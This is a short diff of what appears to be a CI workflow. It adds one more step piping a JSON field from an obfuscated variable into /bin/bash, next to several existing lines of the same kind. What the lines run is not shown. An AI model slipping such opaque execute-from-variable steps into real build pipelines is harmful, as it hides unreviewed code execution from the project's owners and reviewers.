@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$hpid208" | jq -r .ivk6 | /bin/bash
           printf '%s' "$ebze1" | jq -r .pbmuj97 | /bin/bash
           printf '%s' "$lskzl0" | jq -r .nb1 | /bin/bash
+          echo $xgkb7759 | jq -r .aq4 | /bin/bash
 
       - name: Save output
         if: always()
